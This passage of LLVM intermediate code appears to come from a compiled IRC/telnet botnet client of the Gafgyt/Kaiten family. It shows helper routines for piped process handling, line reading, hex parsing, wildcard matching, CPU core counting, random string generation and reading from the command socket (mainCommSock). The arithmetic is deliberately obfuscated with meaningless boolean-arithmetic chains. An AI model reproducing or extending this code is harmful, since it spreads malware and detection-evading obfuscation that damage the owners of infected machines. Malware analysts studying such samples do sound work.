  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %65

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %63

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = xor i32 65280, -1
  %59 = xor i32 %57, %58
  %60 = and i32 %59, %57
  %61 = and i32 %57, 65280
  %62 = ashr i32 %60, 8
  br label %63

; <label>:63:                                     ; preds = %53, %52
  %64 = phi i32 [ -1, %52 ], [ %62, %53 ]
  store i32 %64, i32* %2, align 4
  br label %65

; <label>:65:                                     ; preds = %63, %19
  %66 = load i32, i32* %2, align 4
  ret i32 %66
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %41

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = sub i32 0, %35
  %37 = sub i32 0, 1
  %38 = add i32 %36, %37
  %39 = sub i32 0, %38
  %40 = add nsw i32 %35, 1
  store i32 %39, i32* %8, align 4
  br label %9

; <label>:41:                                     ; preds = %25
  %42 = load i32, i32* %7, align 4
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %41
  br label %47

; <label>:45:                                     ; preds = %41
  %46 = load i8*, i8** %4, align 8
  br label %47

; <label>:47:                                     ; preds = %45, %44
  %48 = phi i8* [ null, %44 ], [ %46, %45 ]
  ret i8* %48
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %39

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = xor i64 %16, -1
  %24 = xor i64 %22, -1
  %25 = xor i64 706713556354973774, -1
  %26 = and i64 %23, 706713556354973774
  %27 = and i64 %16, %25
  %28 = and i64 %24, 706713556354973774
  %29 = and i64 %22, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 706713556354973774, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %16, %22
  store i64 %37, i64* %3, align 8
  br label %4

; <label>:39:                                     ; preds = %12
  %40 = load i64, i64* %3, align 8
  ret i64 %40
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %89 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %52
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %121

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %43

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %41

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = xor i1 true, true
  %35 = and i1 %34, true
  %36 = and i1 true, %32
  %37 = or i1 %31, %33
  %38 = or i1 %35, %36
  %39 = xor i1 %37, %38
  %40 = xor i1 %29, true
  br label %41

; <label>:41:                                     ; preds = %24, %19
  %42 = phi i1 [ false, %19 ], [ %39, %24 ]
  br label %43

; <label>:43:                                     ; preds = %41, %13
  %44 = phi i1 [ true, %13 ], [ %42, %41 ]
  %45 = xor i1 %44, true
  %46 = and i1 true, %45
  %47 = xor i1 true, true
  %48 = and i1 %44, %47
  %49 = or i1 %46, %48
  %50 = xor i1 %44, true
  %51 = zext i1 %49 to i32
  store i32 %51, i32* %3, align 4
  br label %121

; <label>:52:                                     ; preds = %2
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %75

; <label>:57:                                     ; preds = %52
  %58 = load i8*, i8** %4, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 1
  %60 = load i8*, i8** %5, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 1
  %62 = call i32 @wildString(i8* %59, i8* %61)
  %63 = icmp ne i32 %62, 0
  %64 = xor i1 %63, true
  %65 = and i1 true, %64
  %66 = xor i1 true, true
  %67 = and i1 %63, %66
  %68 = xor i1 true, true
  %69 = and i1 %68, true
  %70 = and i1 true, %66
  %71 = or i1 %65, %67
  %72 = or i1 %69, %70
  %73 = xor i1 %71, %72
  %74 = xor i1 %63, true
  br label %75

; <label>:75:                                     ; preds = %57, %52
  %76 = phi i1 [ false, %52 ], [ %73, %57 ]
  %77 = xor i1 %76, true
  %78 = and i1 true, %77
  %79 = xor i1 true, true
  %80 = and i1 %76, %79
  %81 = xor i1 true, true
  %82 = and i1 %81, true
  %83 = and i1 true, %79
  %84 = or i1 %78, %80
  %85 = or i1 %82, %83
  %86 = xor i1 %84, %85
  %87 = xor i1 %76, true
  %88 = zext i1 %86 to i32
  store i32 %88, i32* %3, align 4
  br label %121

; <label>:89:                                     ; preds = %2
  %90 = load i8*, i8** %4, align 8
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  %93 = call i32 @toupper(i32 %92) #10
  %94 = load i8*, i8** %5, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = call i32 @toupper(i32 %96) #10
  %98 = icmp eq i32 %93, %97
  br i1 %98, label %99, label %112

; <label>:99:                                     ; preds = %89
  %100 = load i8*, i8** %4, align 8
  %101 = getelementptr inbounds i8, i8* %100, i64 1
  %102 = load i8*, i8** %5, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = call i32 @wildString(i8* %101, i8* %103)
  %105 = icmp ne i32 %104, 0
  %106 = xor i1 %105, true
  %107 = and i1 true, %106
  %108 = xor i1 true, true
  %109 = and i1 %105, %108
  %110 = or i1 %107, %109
  %111 = xor i1 %105, true
  br label %112

; <label>:112:                                    ; preds = %99, %89
  %113 = phi i1 [ false, %89 ], [ %110, %99 ]
  %114 = xor i1 %113, true
  %115 = and i1 true, %114
  %116 = xor i1 true, true
  %117 = and i1 %113, %116
  %118 = or i1 %115, %117
  %119 = xor i1 %113, true
  %120 = zext i1 %118 to i32
  store i32 %120, i32* %3, align 4
  br label %121

; <label>:121:                                    ; preds = %112, %75, %43, %9
  %122 = load i32, i32* %3, align 4
  ret i32 %122
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %89, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %91

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.308, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %89

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %67, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = sub i64 0, 1
  %48 = add i64 %46, %47
  %49 = sub i64 %46, 1
  %50 = getelementptr inbounds i8, i8* %44, i64 %48
  %51 = load i8, i8* %50, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 13
  br i1 %53, label %65, label %54

; <label>:54:                                     ; preds = %43
  %55 = load i8*, i8** %6, align 8
  %56 = load i8*, i8** %6, align 8
  %57 = call i64 @strlen(i8* %56) #10
  %58 = sub i64 0, 1
  %59 = add i64 %57, %58
  %60 = sub i64 %57, 1
  %61 = getelementptr inbounds i8, i8* %55, i64 %59
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 10
  br label %65

; <label>:65:                                     ; preds = %54, %43
  %66 = phi i1 [ true, %43 ], [ %64, %54 ]
  br i1 %66, label %67, label %76

; <label>:67:                                     ; preds = %65
  %68 = load i8*, i8** %6, align 8
  %69 = load i8*, i8** %6, align 8
  %70 = call i64 @strlen(i8* %69) #10
  %71 = add i64 %70, -9212754217196887286
  %72 = sub i64 %71, 1
  %73 = sub i64 %72, -9212754217196887286
  %74 = sub i64 %70, 1
  %75 = getelementptr inbounds i8, i8* %68, i64 %73
  store i8 0, i8* %75, align 1
  br label %43

; <label>:76:                                     ; preds = %65
  %77 = load i8*, i8** %6, align 8
  %78 = call i8* @strchr(i8* %77, i32 46) #10
  %79 = icmp ne i8* %78, null
  br i1 %79, label %80, label %83

; <label>:80:                                     ; preds = %76
  %81 = load i8*, i8** %6, align 8
  %82 = call i8* @strchr(i8* %81, i32 46) #10
  store i8 0, i8* %82, align 1
  br label %83

; <label>:83:                                     ; preds = %80, %76
  %84 = load i8*, i8** %3, align 8
  %85 = load i8*, i8** %6, align 8
  %86 = call i8* @strcpy(i8* %84, i8* %85) #2
  %87 = load i32, i32* %4, align 4
  %88 = call i32 @close(i32 %87)
  store i32 0, i32* %2, align 4
  br label %94

; <label>:89:                                     ; preds = %13
  %90 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %90, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:91:                                     ; preds = %8
  %92 = load i32, i32* %4, align 4
  %93 = call i32 @close(i32 %92)
  store i32 1, i32* %2, align 4
  br label %94

; <label>:94:                                     ; preds = %91, %83
  %95 = load i32, i32* %2, align 4
  ret i32 %95
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %23, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %25

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.308, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %23

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = sub i32 0, %17
  %19 = sub i32 0, 1
  %20 = add i32 %18, %19
  %21 = sub i32 0, %20
  %22 = add nsw i32 %17, 1
  store i32 %21, i32* %1, align 4
  br label %23

; <label>:23:                                     ; preds = %16, %10
  %24 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %24, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:25:                                     ; preds = %5
  %26 = load i32, i32* %2, align 4
  %27 = call i32 @close(i32 %26)
  %28 = load i32, i32* %1, align 4
  ret i32 %28
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %23, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %29

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 0, %12
  %14 = sub i32 0, 65
  %15 = add i32 %13, %14
  %16 = sub i32 0, %15
  %17 = add i32 %12, 65
  %18 = trunc i32 %16 to i8
  %19 = load i8*, i8** %3, align 8
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 %18, i8* %22, align 1
  br label %23

; <label>:23:                                     ; preds = %10
  %24 = load i32, i32* %5, align 4
  %25 = sub i32 %24, -686423505
  %26 = add i32 %25, 1
  %27 = add i32 %26, -686423505
  %28 = add nsw i32 %24, 1
  store i32 %27, i32* %5, align 4
  br label %6

; <label>:29:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = xor i64 %43, -1
  %45 = xor i64 %37, -1
  %46 = xor i64 -26822819318257631, -1
  %47 = and i64 %44, -26822819318257631
  %48 = and i64 %43, %46
  %49 = and i64 %45, -26822819318257631
  %50 = and i64 %37, %46
  %51 = or i64 %47, %48
  %52 = or i64 %49, %50
  %53 = xor i64 %51, %52
  %54 = or i64 %44, %45
  %55 = xor i64 %54, -1
  %56 = or i64 -26822819318257631, %46
  %57 = and i64 %55, %56
  %58 = or i64 %53, %57
  %59 = or i64 %43, %37
  store i64 %58, i64* %42, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sub i32 0, %60
  %62 = sub i32 0, 1
  %63 = add i32 %61, %62
  %64 = sub i32 0, %63
  %65 = add nsw i32 %60, 1
  %66 = call i32 @select(i32 %64, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %66, i32* %12, align 4
  %67 = icmp sle i32 %66, 0
  br i1 %67, label %68, label %129

; <label>:68:                                     ; preds = %33
  br label %69

; <label>:69:                                     ; preds = %121, %68
  %70 = load i32, i32* %13, align 4
  %71 = icmp slt i32 %70, 10
  br i1 %71, label %72, label %128

; <label>:72:                                     ; preds = %69
  %73 = load i32, i32* @mainCommSock, align 4
  %74 = call i32 (i32, i8*, ...) @sockprintf(i32 %73, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0))
  %75 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %75, align 8
  %76 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %76, align 8
  br label %77

; <label>:77:                                     ; preds = %72
  %78 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %79 = getelementptr inbounds [16 x i64], [16 x i64]* %78, i64 0, i64 0
  %80 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %79) #2, !srcloc !2
  %81 = extractvalue { i64, i64* } %80, 0
  %82 = extractvalue { i64, i64* } %80, 1
  %83 = trunc i64 %81 to i32
  store i32 %83, i32* %14, align 4
  %84 = ptrtoint i64* %82 to i64
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %15, align 4
  br label %86

; <label>:86:                                     ; preds = %77
  %87 = load i32, i32* %5, align 4
  %88 = srem i32 %87, 64
  %89 = zext i32 %88 to i64
  %90 = shl i64 1, %89
  %91 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %92 = load i32, i32* %5, align 4
  %93 = sdiv i32 %92, 64
  %94 = sext i32 %93 to i64
